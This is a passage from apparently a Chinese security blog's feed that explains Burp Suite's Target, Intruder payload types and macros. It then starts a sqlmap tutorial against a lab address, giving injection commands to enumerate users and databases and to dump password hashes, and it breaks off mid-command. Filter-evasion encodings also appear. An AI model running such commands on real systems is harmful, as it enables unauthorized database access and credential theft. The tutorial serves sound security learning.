拦截，则请求消息匹配包含规则列表中的将会被拦截；反之，请求消息匹配去除列表中的将 不会被拦截。</p><p><img src="/2021/11/15/day34/image-20211115192408099.png" alt="image-20211115192408099"></p><p>从上图的添加 规则对话框中我们可以看出，规则主要由协议、域名或IP地址、端口、文件名4个部分组成， 这就意味着我们可以从协议、域名或IP地址、端口、文件名4个维度去控制哪些消息出现在允许或去除在规则列表中。</p><p>当我们设置了Target Scope （默认全部为允许），使用Burp Proxy进行代理拦截，在渗透测 试中通过浏览器代理浏览应用时，Burp会自动将浏览信息记录下来，包含每一个请求和应答 的详细信息，保存在Target站点地图中。</p><h3 id="站点地图-site-map"><a href="#站点地图-site-map" class="headerlink" title="站点地图 site map"></a>站点地图 site map</h3><p>下图所示站点地图为一次渗透测试中，通过浏览器浏览的历史记录在站点地图中的展现结 果。</p><p><img src="/2021/11/15/day34/image-20211115192618871.png" alt="image-20211115192618871"></p><p>从图中我们可以看出，Site Map的左边为访问的URL，按照网站的层级和深度，树形展示整 个应用系统的结构和关联其他域的url情况；右边显示的是某一个url被访问的明细列表，共访 问哪些url，请求和应答内容分别是什么，都有着详实的记录。 </p><p>基于左边的树形结构，我们可 以选择某个分支，对指定的路径进行扫描和抓取。 </p><p><img src="/2021/11/15/day34/image-20211115192715467.png" alt="image-20211115192715467"></p><p>同时，我们也可以将某个域直接加入 Target Scope中</p><p><img src="/2021/11/15/day34/image-20211115193232487.png" alt="image-20211115193232487"></p><p>除了加入 Target Scope外，从上图中，我们也可以看到，对于站点地图的分层，可以通过折 叠和展开操作，更好的分析站点结构</p><h3 id="target模块使用"><a href="#target模块使用" class="headerlink" title="target模块使用"></a>target模块使用</h3><p>Target 模块的使用的使用主要包括以下部分： </p><ul><li>手工获取站点地图 </li><li>站点比较 </li><li>攻击面分析 </li></ul><p>当我们手工获取站点地图时，需要遵循以下操作步骤： </p><ol><li>设置浏览器代理和Burp Proxy代 理，并使之能正常工作。 </li><li>关闭Burp Proxy的拦截功能。 </li><li>手工浏览网页</li></ol><p>这时，Target会 自动记录站点地图信息。 </p><p>手工获取站点地图的方式有一个好处就是，我们可以根据自己的需 要和分析，自主地控制访问内容，记录的信息比较准确。与自动抓取相比，则需要更长的时 间，如果需要渗透测试的产品系统是大型的系统，则对于系统的功能点依次操作一遍所需要 的精力和时间对渗透测试人员来说付出都是很大的。 </p><p>站点比较是一个Burp提供给渗透测试人员对站点进行动态分析的利器，我们在比较帐号权限 时经常使用到它。当我们登陆应用系统，使用不同的帐号，帐号本身在应用系统中被赋予了 不同的权限，那么帐号所能访问的功能模块、内容、参数等都是不尽相同的，此时使用站点 比较，能很好的帮助渗透测试人员区分出来。一般来说，主要有以下3种场景： </p><ol><li>同一个帐 号，具有不同的权限，比较两次请求结果的差异。 </li><li>两个不同的帐号，具有不同的权限，比 较两次请求结果的差异。 </li><li>两个不同的帐号，具有相同的权限，比较两次请求结果的差异。 </li></ol><h4 id="站点比较："><a href="#站点比较：" class="headerlink" title="站点比较："></a>站点比较：</h4><p>1.首先我们在需要进行比较的功能链接上右击， 找到站点比较的菜单，点击菜单进入下一步。 </p><p><img src="/2021/11/15/day34/image-20211115193903324.png" alt="image-20211115193903324"></p><p>2.由于站点比较是在两个站点地图之间进行的，所以我们在配置过程中需要分别指定Site Map 1和Site Map2。通常情况下，Site Map 1 我们默认为当前会话。如图所示，点击【Next】。 </p><p><img src="/2021/11/15/day34/image-20211115193941067.png" alt="image-20211115193941067"></p><p>3.这时我们会进入Site Map 1 设置页面，如果是全站点比较我们选择第一项，如果仅仅比较我 们选中的功能，则选择第二项。如下图，点击【Next】。如果全站点比较，且不想加载其他 域时，我们可以勾选只选择当前域。 </p><p><img src="/2021/11/15/day34/image-20211115194310168.png" alt="image-20211115194310168"></p><p>4.接下来就是Site Map 2 的配置，对于Site Map 2我们同样有两种方式，第一种是之前我们已 经保存下来的Burp Suite 站点记录，第二种是重新发生一次请求作为Site Map2.这里，我们选 择第二种方式。 </p><p><img src="/2021/11/15/day34/image-20211115194636024.png" alt="image-20211115194636024"></p><p>5.如果上一步选择了第二种方式，则进入请求消息设置界面。在这个界面，我们需要指定通信 的并发线程数、失败重试次数、暂停的间隙时间。 </p><p><img src="/2021/11/15/day34/image-20211115195134217.png" alt="image-20211115195134217"></p><p>6.设置完Site Map 1 和Site Map 2之后，将进入请求消息匹配设置。在这个界面，我们可以通 过URL文件路径、Http请求方式、请求参数、请求头、请求Body来对匹配条件进行过滤。</p><p><img src="/2021/11/15/day34/image-20211115195158211.png" alt="image-20211115195158211"></p><p>7.设置请求匹配条件，接着进入应答比较设置界面。在这个界面上，我们可以设置哪些内容 我们指定需要进行比较的。从下图我们可以看出，主要有响应头、form表单域、空格、MIME 类型。点击【Next】。 </p><p><img src="/2021/11/15/day34/image-20211115195352015.png" alt="image-20211115195352015"></p><p>8.如果我们之前是针对全站进行比较，且是选择重新发生一次作为Site Map2的方式，则界面 加载过程中会不停提示你数据加载的进度，如果涉及功能请求的链接较少，则很快进入比较 界面。如下图。 </p><p><img src="/2021/11/15/day34/image-20211115195631294.png" alt="image-20211115195631294"></p><p>9.从上图我们可以看到，站点比较的界面上部为筛选过滤器（这个过滤器与其他过滤器使用雷 同，此处不再赘述），下部由左、中、右三块构成。左边为请求的链接列表，中间为Site Map 1 和Site Map 2的消息记录，右边为消息详细信息。当我们选择Site Map 1某条消息记录 时，默认会自动选择Site Map 2与之对应的记录，这是有右上角的【同步选择】勾选框控制 的，同时，在右边的消息详细区域，会自动展示Site Map 1与Site Map 2通信消息的差异，包含请求消息和应答消息，存在差异的地方用底色标注出来。 </p><p><img src="/2021/11/15/day34/image-20211115195942823.png" alt="image-20211115195942823"></p><h4 id="攻击面分析："><a href="#攻击面分析：" class="headerlink" title="攻击面分析："></a>攻击面分析：</h4><p>攻击面分析是Burp Suite 交互工具（Engagement tools）中的功能，这里我们先看看Analyze Target使用。 </p><p>1.首先，我们通过站点地图，打开 Analyze Target，如图所示。 </p><p><img src="/2021/11/15/day34/image-20211115200053267.png" alt="image-20211115200053267"></p><p>2.在弹出的分析界面中，我们能看到概况、动态URL、静态URL、参数4个视图。</p><p><img src="/2021/11/15/day34/image-20211115200145326.png" alt="image-20211115200145326"></p><p>3.概况视图主要展示当前站点动态URL数量、静态URL数量、参数的总数、唯一的参数名数 目，通过这些信息，我们对当前站点的总体状况有粗线条的了解。 </p><p>4.动态URL视图展示所有 动态的URL请求和应答消息，跟其他的工具类似，当你选中某一条消息时，下方会显示此消 息的详细信息。 </p><p><img src="/2021/11/15/day34/image-20211115200312753.png" alt="image-20211115200312753"></p><p>5.静态URL视图与动态URL视图类似，如图</p><p><img src="/2021/11/15/day34/image-20211115200353400.png" alt="image-20211115200353400"></p><p>6.参数视图有上中下三部分组成，上部为参数和参数计数统计区，你可以通过参数使用的次数 进行排序，对使用频繁的参数进行分析；中部为参数对于的使用情况列表，记录对于的参数 每一次的使用记录；下部为某一次使用过程中，请求消息和应答消息的详细信息。 </p><p><img src="/2021/11/15/day34/image-20211115200451761.png" alt="image-20211115200451761"></p><p>在使用攻击面分析功能时，需要注意，此功能主要是针对站点地图中的请求URL进行分析， 如果某些URL没有记录，则不会被分析到。同时，在实际使用中，存在很点站点使用伪静 态，如果请求的URL中不带有参数，则分析时无法区别，只能当做静态URL来分析。</p><h2 id="intruder模块使用"><a href="#intruder模块使用" class="headerlink" title="intruder模块使用"></a>intruder模块使用</h2><p>在渗透测试过程中，我们经常使用Burp Intruder，它的工作原理是：</p><p>Intruder在原始请求数据的基础上，通过修改各种请求参数，以获取不同的请求应答。每一次请求中，Intruder通常会 携带一个或多个有效攻击载荷（Payload)，在不同的位置进行攻击重放，通过应答数据的比对分析来获得需要的特征数据。Burp Intruder通常被使用在以下场景： </p><ol><li><p>标识符枚举 Web应用程序经常使用标识符来引用用户、账户、资产等数据信息。例如， 用户名、文件ID和账户号码。 </p></li><li><p>提取有用的数据。在某些场景下，而不是简单地识别有效标识符，你需要通过简单标识符，提取一些其他的数据。比如说，你想通过用户的个人空间id，获取所有用户在个人空间标准的昵称和年龄。 </p></li><li><p>模糊测试，很多输入型的漏洞，如SQL注入，跨站点脚本和文件路径遍历。可以通过请求参数提交各种测试字符串，并分析错误消息和其他异常情况，来对应用程序进行检测。由 于的应用程序的大小和复杂性，手动执行这个测试是一个耗时且繁琐的过程。这样的场 景，您可以设置Payload，通过Burp Intruder自动化地对Web应用程序进行模糊测试。 </p></li></ol><p>具体操作流程不赘述。options也不赘述了。</p><h3 id="payload攻击类型"><a href="#payload攻击类型" class="headerlink" title="payload攻击类型"></a>payload攻击类型</h3><p>目前攻击类型主要有四种：</p><ul><li>狙击手模式（Sniper）——它使用一组Payload集合，依次替换Payload位置上（<strong>一次攻击只能使用一个Payload位置</strong>）被§标志的文本（而没有被§标志的文本将不受影响），对 服务器端进行请求，通常用于测试请求参数是否存在漏洞。 </li><li>攻城锤模式（Battering ram）——它使用单一的Payload集合，依次替换Payload位置上被§标志的文本（而没有被§标志的文本将不受影响），对服务器端进行请求，与狙击手 模式的区别在于，如果有多个参数且都为Payload位置标志时，使用的Payload值是相同的，而狙击手模式只能使用一个Payload位置标志。 </li><li>草叉模式（Pitchfork ）——它可以使用多组Payload集合，<strong>在每一个不同的Payload标志位置上（最多20个），遍历所有的Payload</strong>。举例来说，如果有两个Payload标志位置， 第一个Payload值为A和B，第二个Payload值为C和D，则发起攻击时，将共发起两次攻击，第一次使用的Payload分别为A和C，第二次使用的Payload分别为B和D。 </li><li>集束炸弹模式（Cluster bomb） 它可以使用多组Payload集合，在每一个不同的Payload 标志位置上（最多20个），依次遍历所有的Payload。它与草叉模式的主要区别在于，<strong>执行Payload数据Payload组的乘积</strong>。举例来说，如果有两个Payload标志位置，第一个 Payload值为A和B，第二个Payload值为C和D，则发起攻击时，将共发起四次攻击，第 一次使用的Payload分别为A和C，第二次使用的Payload分别为A和D，第三次使用的 Payload分别为B和C，第四次使用的Payload分别为B和D。 </li></ul><h3 id="payload类型与处理"><a href="#payload类型与处理" class="headerlink" title="payload类型与处理"></a>payload类型与处理</h3><p>在Burp Intruder的Payload选项卡中，有Payload集合的设置选项，包含了经常使用的Payload 类型，共18种。</p><p><img src="/2021/11/15/day34/image-20211118210101952.png" alt="image-20211118210101952"></p><p>分别是：</p><h4 id="简单列表-Simple-list"><a href="#简单列表-Simple-list" class="headerlink" title="简单列表(Simple list)"></a>简单列表(Simple list)</h4><p>——最简单的Payload类型，通过配置一个字符串列表作为 Payload，也可以手工添加字符串列表或从文件加载字符串列表。其设置界面如下图：选择的Payload列表中，已经预定义了一组简单Payload列表，包括XSS脚本、CGI 脚本、SQL注入脚本、数字、大写字母、小写字母、用户名、密码、表单域的字段名、 IIS文件名和目录名等等，比较方便。 </p><p><img src="/2021/11/15/day34/image-20211118210359162.png" alt="image-20211118210359162"></p><h4 id="运行时文件-Runtime-file"><a href="#运行时文件-Runtime-file" class="headerlink" title="运行时文件(Runtime file)"></a>运行时文件(Runtime file)</h4><p>——指定文件，作为相对应Payload位置上的Payload列表。 </p><p>其设置界面如下图： </p><p><img src="/2021/11/15/day34/image-20211118210646569.png" alt="image-20211118210646569"></p><p>当我们如上图所示操作，指定Payload set的位置1使用的Payload类型为Runtime file时，下方 的Payload Options将自动改变为文件选择按钮和输入框，当我们点击【select file】选择 文件时，将弹出图中所示的对话框，选择指定的Payload文件。运行时，Burp Intruder将 读取文件的每一行作为一个Payload。 </p><h4 id="自定义迭代器-Custom-iterator"><a href="#自定义迭代器-Custom-iterator" class="headerlink" title="自定义迭代器(Custom iterator)"></a>自定义迭代器(Custom iterator)</h4><p>——这是一款功能强大的Payload，它共有8个占位， 每一个占位可以指定简单列表的Payload类型，然后根据占位的多少，与每一个简单列表 的Payload进行笛卡尔积，生成最终的Payload列表。</p><p>例如，某个参数的值格式是 username@@password，则设置此Payload的步骤是：</p><p>位置1，选择Usernames <img src="/2021/11/15/day34/image-20211118211432235.png" alt="image-20211118211432235"></p><p>位置2，输入值@@</p><p><img src="/2021/11/15/day34/image-20211118211517984.png" alt="image-20211118211517984"></p><p>位置3，选择passwords</p><p><img src="/2021/11/15/day34/image-20211118211603669.png" alt="image-20211118211603669"></p><p>开始攻击后payload如下</p><p><img src="/2021/11/15/day34/image-20211118211736789.png" alt="image-20211118211736789"></p><h4 id="字符串替换-Character-substitution"><a href="#字符串替换-Character-substitution" class="headerlink" title="字符串替换(Character substitution)"></a>字符串替换(Character substitution)</h4><p>——顾名思义，此种Payload的类型是对预定义的 字符串进行替换后生成新的Payload。</p><p>比如说，预定义字符串为ABCD，按照下图的替换 规则设置后，将对AB的值进行枚举后生成新的Payload。 <img src="/2021/11/15/day34/image-20211118212316190.png" alt="image-20211118212316190"></p><p>生成的payload如下</p><p><img src="/2021/11/15/day34/image-20211118212405399.png" alt="image-20211118212405399"></p><h4 id="大小写替换-Case-modification"><a href="#大小写替换-Case-modification" class="headerlink" title="大小写替换(Case modification)"></a>大小写替换(Case modification)</h4><p>——对预定义的字符串，按照大小写规则，进行替换。</p><p>比如说，预定义的字符串为Alan Walker，则按照下图的设置后，会生成新的 Payload。 </p><p><img src="/2021/11/15/day34/image-20211118212935624.png" alt="image-20211118212935624"></p><p>生成规则由上而下依次是：No change（不改变，使用原始字符串）、To lower case（转为小写字母）、To upper case（转为大写字母）、To Propername（首字母大 写，其他小写）、To ProperName（首字母大写，其他不改变）。</p><p>生成的payload如下</p><p><img src="/2021/11/15/day34/image-20211118212852527.png" alt="image-20211118212852527"></p><h4 id="递归grep-Recursive-grep"><a href="#递归grep-Recursive-grep" class="headerlink" title="递归grep(Recursive grep)"></a>递归grep(Recursive grep)</h4><p>——此Payload类型主要使用于从服务器端提取有效数据的 场景。需要先从服务器的响应中提取数据作为Payload，然后替换Payload的位置，进行攻击。它的数据来源于原始的响应消息，基于原始响应，在Payload的可选项设置 （Options）中配置Grep规则，然后根据grep去提取数据才能发生攻击。</p><p>比如，我在 grep extract 中设置取服务器端的EagleId作为新的Payload值。</p><p>位置</p><p><img src="/2021/11/15/day34/image-20211118214523727.png" alt="image-20211118214523727"></p><p>设置内容：</p><p><img src="/2021/11/15/day34/image-20211118214553768.png" alt="image-20211118214553768"></p><p>ok后完成payload设置</p><p><img src="/2021/11/15/day34/image-20211118214818818.png" alt="image-20211118214818818"></p><p>当我发起攻击时，Burp会对每一次响应的消息进行分析，如果提取到了EagleId的值，则 作为Payload再发生一次请求。操作图如下：</p><p><img src="/2021/11/15/day34/image-20211118214856873.png" alt="image-20211118214856873"></p><p>可以看到请求序号为偶数的消息的Payload是上一次服务器端响应的报文中的EagleId值。</p><h4 id="不合法的Unicode编码-Illegal-Unicode"><a href="#不合法的Unicode编码-Illegal-Unicode" class="headerlink" title="不合法的Unicode编码(Illegal Unicode)"></a>不合法的Unicode编码(Illegal Unicode)</h4><p>—— 在payloads里用指定的不合法Unicode 编码替换字符本身，从这些Payload列表里产生出一个或者多个有效负荷。在尝试回避基于模式匹配的输入验证时，这个有效负荷会有用的。</p><p>例如，在防御目录遍历攻击时../和..序列的期望编码的匹配。其配置界面如下：</p><p><img src="/2021/11/15/day34/image-20211123134936839.png" alt="image-20211123134936839"></p><p>上图中的配置选项主要用来控制不合法编码的生成，各项的含义如下： </p><ul><li><strong>maximum overlong UTF-8 length</strong> Unicode 编码允许最多使用 6 字节表示一个字符。使用一种类型 就可以正确地表示出(0x00-0x7F) Basic ASCII 字符。然而，使用多字节的Unicode 方案 也能表示出它们(如， ”overlong”编码)。下拉菜单用来指定是否使用超长编码，以及应该设定的最大使用长度。 </li><li><strong>Illegal UTF-8 continuation bytes</strong> 当选择的最大超长 UTF-8 长 度为 2 字节以上，这个选项是可用的。 </li><li><strong>Do illegal UTF-8</strong> 当使用多字节编码一个字符 时，第一个字节后面的字节应该用 10XXXXXX 这样的二进制格式，来指出后续的字节。 然而，第一个字节里最有意义的位会指出后面还有多少后续字节。因此，Unicode 编码 例程会安全地忽略掉后续字节的前 2 位。这就意味着每个后续字节可能有 3 个非法变 种，格式为 00XXXXXX， 01XXXXXX 和 11XXXXXX。如果选中这个选项，则非法 Unicode 有效负荷源会为每个后续字节生成 3 个附加编码。 </li><li><strong>Maximize permutations in multi-byte encodings</strong> 如果选择的最大超长 UTF-8 长度为 3 字节以上，并且选中” illegal UTF-8 ”这个选项可用。如果”Maximize permutations in multi-byte encodings”没被 选中，则在生产非法变种时，不合法 Unicode 有效负荷源会按顺序处理每个后续字节， 为每个后续字节产生 3 个非法变种，并且其他的后续字节不会改变。如果”Maximize permutations in multi-byte encodings”被选中了，不合法 的Unicode 有效负荷源会为后续 字节生成所有的非法变种排序 。 如，多个后续字节会同时被修改。在目标系统上回避高 级模式匹配控制时，这个功能就会很有用。 </li><li><strong>Illegal hex</strong> 这个选择基本上一直可用。当使 用超长编码和后续字节的非法变种(如果选中)生成非法编码项列表时，通过修改由此产生 的十六进制编码可能会迷惑到某种模式匹配控制。十六进制编码使用字符 A—F 代表十进 制 10—15 的值。然而有些十六进制编码会把G解释为 16， H 为 17，等等。因此 0x1G 会被解释为 32。另外，如果非法的十六进制字符使用在一个 2 位数的十六进制编码的第 一个位置，则由此产生的编码就会溢出单个字节的大小，并且有些十六进制编码只使用 了结果数字的后 8 个有效位，因此 0x1G 会被解码为 257，而那时会被解释为 1。每个合法的 2 位数的十六进制编码有 4—6 种相关的非法十六进制表示，如果使用的是上面的编 码，则这些表示会被解释为同一种十六进制编码。如果”illegal hex”被选中，则非法 Unicode 有效负荷源会在非法编码项列表里，生成每个字节的所有可能的非法十六进制 编码。 </li><li><strong>Maximize permutations in multi-byte encodings</strong> 如果选中的最大超长 UTF-8 长度为 2 字节以上并且“illegal hex”也被选中，则这个选项可用。如果Maximize permutations in multi-byte encodings”没被选中，在生成非法十六进制编码时，非法 Unicode 有效负荷源会按顺序处理每个字节。对于每个字节，会生成 4—6 个非法十六进 制编码，其他的字节不变。如果Maximize permutations in multi-byte encodings”被选 中，则非法 Unicode 有效负荷源会为所有的字节，生成非法十六进制的所有排序。如， 多个字节会被同时修改。在目标系统上回避高级模式匹配控制时，这个功能会非常有 用。 </li><li><strong>add % prefix</strong> 如果选中这个选项，在产生的有效负荷里的每个 2 位数十六进制编码 前面，都会插入一个%符号。 </li><li><strong>Use lower case alpha characters</strong> 这个选项决定了是否在 十六进制编码里使用大小写字母。 </li><li><strong>Total encodings</strong> 这个选项为会产生的非法编码数量 放置了一个上界，如果大量使用超长编码或者选中了最大列表，这个选项会很有用，因 为那会生成大量的非法编码。 </li><li><strong>Match / replace in list items</strong> 这个选项用户控制Payload 列表中的字符串，它是由匹配字符（Match character）和替换字符编码（Replace with encodings of ）来成对的控制Payload的生成。 </li></ul><p>当攻击执行时，这个有效负荷源会迭代所有预设项列表，在非法编码集合里，每个预设项替换每个项里的指定字符的所有实例。</p><h4 id="字符块-Character-blocks"><a href="#字符块-Character-blocks" class="headerlink" title="字符块(Character blocks)"></a>字符块(Character blocks)</h4><p>——这种类型的Payload是指使用一个给出的输入字符串， 根据指定的设置产生指定大小的字符块，表现形式为生成指定长度的字符串。它通常使用于边界测试或缓冲区溢出。 </p><p><img src="/2021/11/15/day34/image-20211123135739175.png" alt="image-20211123135739175"></p><ul><li>Base string 是指设置原始字符串</li><li>Min length是指Payload的最小长度</li><li>Max length 是指 Payload的最大长度</li><li>Step是指生成Payload时的步长。</li></ul><p>如上图的配置后，生成的Payload 如下图所示： </p><p><img src="/2021/11/15/day34/image-20211123135941195.png" alt="image-20211123135941195"></p><h4 id="数字类型-Number"><a href="#数字类型-Number" class="headerlink" title="数字类型(Number)"></a>数字类型(Number)</h4><p>——这种类型的Payload是指根据配置，生成一系列的数字作为 Payload。它的设置界面如下：</p><p><img src="/2021/11/15/day34/image-20211123140112920.png" alt="image-20211123140112920"></p><ul><li><strong>Type</strong>表示使用序列还是随机数</li><li><strong>From</strong>表示从什么数字开始</li><li><strong>To</strong>表示到什么数字截 止</li><li><strong>Step</strong>表示步长是多少</li><li>如果是随机数，则<strong>How many</strong>被激活，表示一共生成多少个 随机数。</li><li><strong>Base</strong>表示数字使用十进制还是十六进制形式</li><li><strong>Min integer digits</strong> 表示最小的整数是多少</li><li><strong>Max integer digits</strong>表示最大的整数是多少</li><li>如果是10进制，则<strong>Min fractiondigits</strong> 表示小数点后最少几位数，<strong>Max fraction digits</strong>表示小数点后最多几位数。</li></ul><h4 id="日期类型-Dates"><a href="#日期类型-Dates" class="headerlink" title="日期类型(Dates)"></a>日期类型(Dates)</h4><p>——这种类型的Payload是指根据配置，生成一系列的日期。界面如 下</p><p><img src="/2021/11/15/day34/image-20211123140528748.png" alt="image-20211123140528748"></p><h4 id="暴力字典-Brute-forcer"><a href="#暴力字典-Brute-forcer" class="headerlink" title="暴力字典(Brute forcer)"></a>暴力字典(Brute forcer)</h4><p>——此类Payload生成包含一个指定的字符集的所有排列特定长度的有效载荷，通常用于枚举字典的生成，其设置界面如下：</p><p><img src="/2021/11/15/day34/image-20211123140829765.png" alt="image-20211123140829765"></p><ul><li><strong>Character set</strong> 表示生成字典的数据集，从此数据集中抽取字符进行生成。</li><li><strong>Min length</strong>表 示生成Payload的最小长度</li><li><strong>Max length</strong>表示生成Payload的最大长度。 </li></ul><h4 id="空类型-Null-payloads"><a href="#空类型-Null-payloads" class="headerlink" title="空类型(Null payloads)"></a>空类型(Null payloads)</h4><p>——这种负载类型产生的Payload，其值是一个空字符串。在攻击时，需要同样的请求反复被执行，在没有任何修改原始请求的场景下此Payload是非常有用的。它可用于各种攻击，例如cookie的序列分析、应用层Dos、或保活会话令牌是在其它的间歇试验中使用。 </p><p><img src="/2021/11/15/day34/image-20211123141119823.png" alt="image-20211123141119823"></p><p>在配置Payload生成方式时，它有两个选项，:</p><ul><li>我们可以指定生成（Generate）多少 Payload</li><li>也可以设置为一直持续攻击（Continue indefinitely）</li></ul><h4 id="字符frobber-Character-frobber"><a href="#字符frobber-Character-frobber" class="headerlink" title="字符frobber(Character frobber)"></a>字符frobber(Character frobber)</h4><p>——依次修改指定字符串在每个字符位置的值，每次都是在原字符上递增一个该字符的ASCII码。</p><p>它通常使用于测试系统使用了复杂的会话令牌的部件来跟踪会话状态，当修改会话令牌中的单个字符的值之后，您的会话还是进行了处理，那么很可能是这个令牌实际上没有被用来追踪您的会话。其配置界面如图： </p><p><img src="/2021/11/15/day34/image-20211123141523101.png" alt="image-20211123141523101"></p><p>执行后生成的payload如下：</p><p><img src="/2021/11/15/day34/image-20211123141618516.png" alt="image-20211123141618516"></p><h4 id="Bit翻转-Bit-flipper"><a href="#Bit翻转-Bit-flipper" class="headerlink" title="Bit翻转(Bit flipper)"></a>Bit翻转(Bit flipper)</h4><p>——对预设的Payload原始值，按照比特位，依次进行修改。它的设置界面如下图： </p><p><img src="/2021/11/15/day34/image-20211123141733364.png" alt="image-20211123141733364"></p><ul><li><p><strong>Operate on</strong> 指定是对Payload位置的原始数据进行Bit翻转还是指定值进行Bit翻转</p></li><li><p><strong>Format of original data</strong> 是指是否对原始数据的文本意义进行操作，还是应该把它当作ASCII十六进制</p></li><li><p><strong>Select bits to flip</strong>是指选择翻转的Bit位置。 可以配置基于文本意义进行操作，或基于ASCII十六进制字符串进行翻转。例如，如果原始值 是“ab”，基于文本意义的翻转结果是： </p><pre class="line-numbers language-none"><code class="language-none">`bcbebibqbAb!b¡baca`afajaraBa"a¢<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>如果是基于ASCII十六进制字符串进行翻转，则结果是：</p><pre class="line-numbers language-none"><code class="language-none">aaa9afa3bb8beb2b<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul><p>这种类型的Payload类似于字符frobber，但在你需要更细粒度的控制时是有用的。例如，会话令牌或其他参数值使用CBC模式的块密码加密，有可能系统地由前一密码块内修改 Bit位以改变解密后的数据。在这种情况下，你可以使用的Bit 翻转的Payload来确定加密值内部修改了个别bit位后是否对应用程序产生影响，并了解应用程序是否容易受到攻击。</p><h4 id="用户名生成器-Username-generator"><a href="#用户名生成器-Username-generator" class="headerlink" title="用户名生成器(Username generator)"></a>用户名生成器(Username generator)</h4><p>这种类型的Payload主要用于用户名和email帐号 的自动生成，其设置界面如下图：</p><p><img src="/2021/11/15/day34/image-20211123143255459.png" alt="image-20211123143255459"></p><p>执行生成payload如下：</p><p><img src="/2021/11/15/day34/image-20211123143321200.png" alt="image-20211123143321200"></p><p>ECB 加密块洗牌(ECB block shuffler)</p><p>——这种类型的Payload是基于ECB加密模式的 Payload生成器。其原理是因为 ECB加密模式中每组64位的数据之间相互独立，通过改变分组数据的位置方式来验证应用程序是否易受到攻击。</p><p>其设置界面如下图:</p><p><img src="/2021/11/15/day34/image-20211123143540848.png" alt="image-20211123143540848"></p><h4 id="Burp-Payload生成插件-Extension-generated"><a href="#Burp-Payload生成插件-Extension-generated" class="headerlink" title="Burp Payload生成插件(Extension-generated)"></a>Burp Payload生成插件(Extension-generated)</h4><p>——这种类型的Payload是基于Burp插件来生成Payload值，因此使用前必须安装配置Burp插件，在插件里注册一个Intruder payload生成器，供此处调用。</p><p><img src="/2021/11/15/day34/image-20211123143727838.png" alt="image-20211123143727838"></p><h4 id="Payload复制-Copy-other-payload"><a href="#Payload复制-Copy-other-payload" class="headerlink" title="Payload复制(Copy other payload)"></a>Payload复制(Copy other payload)</h4><p>——这种类型的Payload是将其他位置的参数复制到 Payload位置上作为新的Payload值，通常适用于多个参数的请求消息中，它的使用场景可能是： </p><p>1.两个不同的参数需要使用相同的值，比如说，用户注册时，密码设置会输 入两遍，其值也完全一样，可以使用此Payload类型。 </p><p>2.在一次请求中，一个参数的值是基于另一个参数的值在前端通过脚本来生成的值，可以使用此Payload类型。 </p><p>它的设置界 面和参数比较简单，如下图所示，其中Payload位置的索引值就是指向图中Payload set的 值。</p><p><img src="/2021/11/15/day34/image-20211123144109255.png" alt="image-20211123144109255"></p><h2 id="macros-宏-的使用"><a href="#macros-宏-的使用" class="headerlink" title="macros(宏)的使用"></a>macros(宏)的使用</h2><p>Burpsuite的宏（Macros），是一个预先定义好的HTTP请求序列，这个序列中可以包含一个或多个HTTP请求。在Burpsuite的会话管理规则（Session Handling Rules）中使用宏，可以完成多种任务，典型的使用方式包括：</p><ul><li>通过页面的跳转验证当前的会话是否仍然有效</li><li>执行登陆动作获取新的有效会话</li><li>获取前一次HTTP请求响应的Token或其它参数，作为后续请求的输入参数（如CSRF Token的绕过）</li><li>扫描或模糊测试时，执行一些先前请求，确保扫描请求能被正常执行</li><li>测试请求执行之后，执行后续的请求操作（如结合Intruder使用不同账号登陆后进行批量投票）</li></ul><p>使用宏对有token验证的网站后台密码破解，具体操作在day20中写到</p>]]></content>
      
      
      <categories>
          
          <category> 工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> burpsuite的使用 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sqlmap实战使用</title>
      <link href="/2021/11/09/day33/"/>
      <url>/2021/11/09/day33/</url>
      
        <content type="html"><![CDATA[<h1 id="sqlmap实战使用"><a href="#sqlmap实战使用" class="headerlink" title="sqlmap实战使用"></a>sqlmap实战使用</h1><p>由浅入深的写下使用</p><span id="more"></span><h2 id="实战一"><a href="#实战一" class="headerlink" title="实战一"></a>实战一</h2><p><img src="/2021/11/09/day33/image-20211109154946308.png" alt="image-20211109154946308"></p><h3 id="检测注入"><a href="#检测注入" class="headerlink" title="检测注入"></a>检测注入</h3><p>-u 检测的url</p><p>“”双引号 表示这是一段字符串，（存在&amp;符号所以url用引号包起来）</p><p>–dbms 指定攻击的数据库类型</p><p>-v 输出信息详细程度登记为1</p><pre class="line-numbers language-none"><code class="language-none">python sqlmap.py -u "http://10.163.193.76/06/vul/sqli/sqli_str.php?name=1&amp;submit=%E6%9F%A5%E8%AF%A2" --dbms mysql -v 1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>输入之后sqlmap会自动进行注入，但是会有一些进行提示，需要你在终端进行确认 </p><p>如果使用–batch 会自动进行默认操作，不用进行交互信息确定</p><pre class="line-numbers language-none"><code class="language-none">python sqlmap.py -u "http://10.163.193.76/06/vul/sqli/sqli_str.php?name=1&amp;submit=%E6%9F%A5%E8%AF%A2" --dbms mysql -v 1 --batch<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>程序会自动确认进行SQL注入检测，看到存在注入的参数和攻击payload 也会显示注入的类型 </p><p>可以看到已经给出了结果</p><p><img src="/2021/11/09/day33/image-20211109155703694.png" alt="image-20211109155703694"></p><h3 id="获取敏感信息"><a href="#获取敏感信息" class="headerlink" title="获取敏感信息"></a>获取敏感信息</h3><p>确定存在注入之后，接着通过获取敏感信息命令获取</p><p>–current-user 用户连接的用户</p><p>–currnet-db 当前库</p><p>–is-dba 是否root权限</p><p>–passwords 获取数据库的密码 使用这个命令 sqlmap找到密文时，会提示你是否进行hash破解 如果需要选择合适的字典。</p><pre class="line-numbers language-none"><code class="language-none">python sqlmap.py -u "http://10.163.193.76/06/vul/sqli/sqli_str.php?name=1&amp;submit=%E6%9F%A5%E8%AF%A2" --dbms mysql -v 1 --current-user --current-db --is-dba<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/2021/11/09/day33/image-20211109160310326.png" alt="image-20211109160310326"></p><h3 id="获取所有数据库"><a href="#获取所有数据库" class="headerlink" title="获取所有数据库"></a>获取所有数据库</h3><p>–dbs</p><pre class="line-numbers language-none"><code class="language-none">python sqlmap.py -u 